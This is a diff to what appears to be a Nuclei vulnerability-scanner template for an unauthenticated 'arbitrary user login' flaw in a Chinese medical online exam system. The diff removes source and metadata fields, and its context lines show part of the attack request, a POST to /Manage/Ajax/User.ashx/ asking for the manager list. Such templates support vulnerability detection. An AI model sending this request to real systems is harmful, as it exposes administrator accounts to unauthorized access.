@@ -3,12 +3,8 @@ info:
   name: 远秋医学在线考试系统任意用户登录漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cnslmz45l4iy3edi'
+  description: ''
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cnslmz45l4iy3edi
-    fofa: 暂无
 http:
 - raw:
   - 'POST /Manage/Ajax/User.ashx/ HTTP/1.1
@@ -30,8 +26,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     oper=getManagerList&name=&code=&depart=&page=1&rows=15
